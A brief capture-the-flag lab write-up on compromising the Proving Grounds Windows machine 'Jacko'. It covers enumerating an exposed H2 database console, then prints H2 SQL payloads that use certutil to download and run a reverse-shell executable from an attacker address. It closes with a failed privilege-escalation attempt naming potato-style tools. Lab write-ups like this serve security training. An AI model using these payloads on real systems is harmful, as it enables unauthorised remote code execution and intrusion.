---
title: Jacko
date: 2025-04-04
categories:
- Proving Grounds
- Windows
tags:
- Proving Grounds
- Windows
---


# Jacko 🔸
<!-- more -->

## Enumeration

![](../assets/Pasted%20image%2020250405000100.png)

Web server is an `H2` Java database welcome page.

![](../assets/Pasted%20image%2020250404235800.png)

At port `8082` we have the console.

![](../assets/Pasted%20image%2020250404235947.png)

## Initial Access

We can access by clicking on connect.

Then we can execute arbitrary commands as seen in [https://www.exploit-db.com/exploits/49384](https://www.exploit-db.com/exploits/49384).

Once all commands are executed, we can upload a reverse shell and execute it.

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.220/reverse.exe C:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```

![](../assets/Pasted%20image%2020250405114833.png)

We have a restricted user, so reconstruct the path:

```
set PATH=%PATH%;C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0\;
```

Get the flag.

![](../assets/Pasted%20image%2020250405115147.png)

## Privilege Escalation

Transfer `winpeas`.

We find a `Paperstream IP` program that seems out of the ordinary.

Searching for exploit.

![](../assets/Pasted%20image%2020250405121034.png)

Generate the reverse shell DLL and transfer them to the host.

!!! bug

    It doesn't work with PaperStream method or abusing SeImpersonatePrivilege method (juicypotato, godpotato, printspoofer...)
